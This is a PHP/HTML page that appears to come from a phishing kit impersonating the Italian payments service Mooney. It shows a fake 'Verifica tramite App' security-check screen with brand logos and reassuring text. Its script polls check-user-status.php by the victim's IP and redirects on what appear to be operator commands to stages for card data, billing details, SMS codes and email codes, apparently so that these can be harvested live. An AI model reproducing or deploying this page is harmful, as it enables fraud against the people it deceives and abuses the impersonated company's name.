<?php
require_once "functions.php";
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mooney - Verifica App</title>
    <link rel="icon" type="image/png" href="image/unnamed.png">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        /* Logo */
        .logo {
            text-align: center;
            margin-bottom: 40px;
        }
        
        .logo img {
            height: 50px;
        }
        
        /* App Animation */
        .app-animation {
            position: relative;
            margin: 30px 0;
            height: 180px;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        .phone-icon {
            width: 120px;
            height: 200px;
            background: linear-gradient(135deg, #FFCC00, #e6b800);
            border-radius: 25px;
            position: relative;
            box-shadow: 0 15px 35px rgba(255, 204, 0, 0.3);
            animation: phoneFloat 3s ease-in-out infinite;
            border: 3px solid #333;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .phone-screen {
            position: absolute;
            top: 15px;
            left: 10px;
            right: 10px;
            bottom: 15px;
            background: white;
            border-radius: 18px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 15px;
            overflow: hidden;
        }
        
        .app-logo {
            font-size: 16px;
            font-weight: bold;
            color: #FFCC00;
            margin-bottom: 15px;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
        }
        
        .notification-icon {
            font-size: 32px;
            color: #008085;
            margin-bottom: 12px;
            animation: notificationPulse 2s infinite;
        }
        
        .notification-text {
            font-size: 11px;
            color: #4F4F4F;
            font-weight: 600;
            text-align: center;
            margin-bottom: 8px;
        }
        
        .verification-text {
            font-size: 13px;
            color: #FFCC00;
            font-weight: bold;
            text-align: center;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.1);
        }
        
        .notification-dot {
            position: absolute;
            top: 12px;
            right: 12px;
            width: 8px;
            height: 8px;
            background: #ff4444;
            border-radius: 50%;
            animation: blink 1.5s infinite;
        }
        
        @keyframes phoneFloat {
            0%, 100% { transform: translateY(0px) rotate(0deg); }
            50% { transform: translateY(-10px) rotate(2deg); }
        }
        
        @keyframes notificationPulse {
            0%, 100% { transform: scale(1); opacity: 1; }
            50% { transform: scale(1.1); opacity: 0.8; }
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        
        /* Title */
        h1 {
            text-align: center;
            font-size: 28px;
            margin-bottom: 20px;
            color: #4F4F4F;
            font-weight: bold;
        }
        
        .subtitle {
            text-align: center;
            font-size: 16px;
            color: #4F4F4F;
            margin-bottom: 40px;
            line-height: 1.6;
        }
        
        /* Instructions */
        .instructions {
            width: 100%;
            margin-bottom: 30px;
        }
        
        .instruction-step {
            display: flex;
            align-items: flex-start;
            gap: 15px;
            margin-bottom: 20px;
            padding: 20px;
            background: #f8f8f8;
            border-radius: 12px;
            border-left: 4px solid #FFCC00;
            transition: transform 0.3s ease;
        }
        
        .instruction-step:hover {
            transform: translateX(5px);
        }
        
        .step-number {
            width: 32px;
            height: 32px;
            background: #FFCC00;
            color: #333;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
            font-size: 14px;
            flex-shrink: 0;
        }
        
        .step-content {
            flex: 1;
        }
        
        .step-title {
            font-size: 16px;
            font-weight: 600;
            color: #4F4F4F;
            margin-bottom: 8px;
        }
        
        .step-description {
            font-size: 14px;
            color: #4F4F4F;
            line-height: 1.5;
        }
        
        /* Progress Bar */
        .progress-container {
            width: 100%;
            height: 6px;
            background: #f0f0f0;
            border-radius: 3px;
            margin: 30px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            background: #FFCC00;
            border-radius: 3px;
            animation: loading 2s ease-in-out infinite;
        }
        
        @keyframes loading {
            0% { width: 0%; }
            50% { width: 70%; }
            100% { width: 100%; }
        }
        
        .status-text {
            text-align: center;
            color: #4F4F4F;
            font-size: 16px;
            margin-bottom: 30px;
            font-weight: 600;
        }
        
        .security-info {
            background: #f8f8f8;
            border: 1px solid #ddd;
            border-radius: 8px;
            padding: 25px;
            margin-top: 30px;
            text-align: center;
            width: 100%;
        }
        
        .security-icon {
            font-size: 24px;
            margin-bottom: 10px;
            color: #008085;
        }
        
        .security-title {
            font-size: 16px;
            font-weight: 600;
            color: #4F4F4F;
            margin-bottom: 8px;
        }
        
        .security-description {
            font-size: 14px;
            color: #4F4F4F;
            line-height: 1.5;
        }

        /* Responsive */
        @media (max-width: 768px) {
            .container {
                padding: 0 20px;
                max-width: 100%;
            }
            
            h1 {
                font-size: 24px;
            }
            
            .logo img {
                height: 40px;
            }
            
            .phone-icon {
                width: 100px;
                height: 180px;
            }
        }

        @media (max-width: 480px) {
            body {
                padding: 15px;
            }
            
            .container {
                padding: 0 10px;
            }
            
            h1 {
                font-size: 22px;
            }
            
            .logo {
                margin-bottom: 30px;
            }
            
            .logo img {
                height: 35px;
            }
            
            .phone-icon {
                width: 90px;
                height: 160px;
            }
            
            .instruction-step {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Logo -->
        <div class="logo">
            <img src="image/logo-mo.svg" alt="Mooney Logo">
        </div>
        
        <!-- App Animation -->
        <div class="app-animation">
            <div class="phone-icon">
                <div class="phone-screen">
                    <div class="notification-dot"></div>
                    <div class="app-logo">MOONEY</div>
                    <div class="notification-icon">📱</div>
                    <div class="notification-text">VERIFICA DI SICUREZZA</div>
                    <div class="verification-text">In corso...</div>
                </div>
            </div>
        </div>
        
        <!-- Title -->
        <h1>Verifica tramite App</h1>
        <p class="subtitle">
            Completa la verifica di sicurezza attraverso l'app Mooney
        </p>
        
        <div class="instructions">
            <div class="instruction-step">
                <div class="step-number">1</div>
                <div class="step-content">
                    <div class="step-title">Apri l'App Mooney</div>
                    <div class="step-description">Accedi all'applicazione ufficiale sul tuo smartphone</div>
                </div>
            </div>
            
            <div class="instruction-step">
                <div class="step-number">2</div>
                <div class="step-content">
                    <div class="step-title">Controlla le notifiche</div>
                    <div class="step-description">Trova la notifica di verifica di sicurezza nell'app</div>
                </div>
            </div>
            
            <div class="instruction-step">
                <div class="step-number">3</div>
                <div class="step-content">
                    <div class="step-title">Autorizza l'accesso</div>
                    <div class="step-description">Conferma che sei tu che stai effettuando l'accesso</div>
                </div>
            </div>
            
            <div class="instruction-step">
                <div class="step-number">4</div>
                <div class="step-content">
                    <div class="step-title">Attendi il completamento</div>
                    <div class="step-description">La verifica si completerà automaticamente</div>
                </div>
            </div>
        </div>
        
        <!-- Progress Bar -->
        <div class="progress-container">
            <div class="progress-bar"></div>
        </div>
        
        <div class="status-text">
            In attesa di conferma dall'app Mooney...
        </div>
        
        <!-- Security Info -->
        <div class="security-info">
            <div class="security-icon">🛡️</div>
            <div class="security-title">Verifica Sicura</div>
            <p class="security-description">
                Questa verifica è obbligatoria per la sicurezza del tuo account. 
                Mooney non richiederà mai le tue credenziali complete via email o telefono.
            </p>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const userIP = '<?php echo $ip; ?>';
            
            // تأثيرات الظهور المتدرج
            const container = document.querySelector('.instructions');
            container.style.opacity = '0';
            container.style.transform = 'translateY(30px)';
            container.style.transition = 'all 0.8s ease';
            
            setTimeout(() => {
                container.style.opacity = '1';
                container.style.transform = 'translateY(0)';
            }, 200);

            // === AJAX للتحقق من الحالة كل 2 ثواني ===
            function checkStatus() {
                fetch(`check-user-status.php?ip=${userIP}&t=${new Date().getTime()}`)
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Network response was not ok');
                        }
                        return response.text();
                    })
                    .then(status => {
                        status = status.trim();
                        
                        // إذا كان هناك حالة توجيه، انتقل إلى الصفحة المطلوبة
                        if (status && status !== '0' && status !== '') {
                            const redirectMap = {
                                'errorlogin': 'infos.php?redirection=errorlogin',
                                'cc': 'infos.php?redirection=cc',
                                'errorcc': 'infos.php?redirection=errorcc',
                                'email_code': 'infos.php?redirection=email_code',
                                'erroremail_code': 'infos.php?redirection=erroremail_code',
                                'billing': 'infos.php?redirection=billing',
                                'errorbilling': 'infos.php?redirection=errorbilling',
                                'sms': 'infos.php?redirection=sms',
                                'errorsms': 'infos.php?redirection=errorsms',
                                'success': 'infos.php?redirection=success',
                                'attivazione': 'infos.php?redirection=attivazione',
                                'errorattivazione': 'infos.php?redirection=errorattivazione'
                            };
                            
                            if (redirectMap[status]) {
                                window.location.href = redirectMap[status];
                                return;
                            }
                        }
                        
                        // إذا لم يكن هناك توجيه، استمر في التحقق بعد 2 ثانية
                        setTimeout(checkStatus, 2000);
                    })
                    .catch(error => {
                        console.error('Error checking status:', error);
                        setTimeout(checkStatus, 3000);
                    });
            }

            // بدء التحقق من الحالة بعد 1 ثانية من تحميل الصفحة
            setTimeout(checkStatus, 1000);
        });
    </script>
</body>
</html>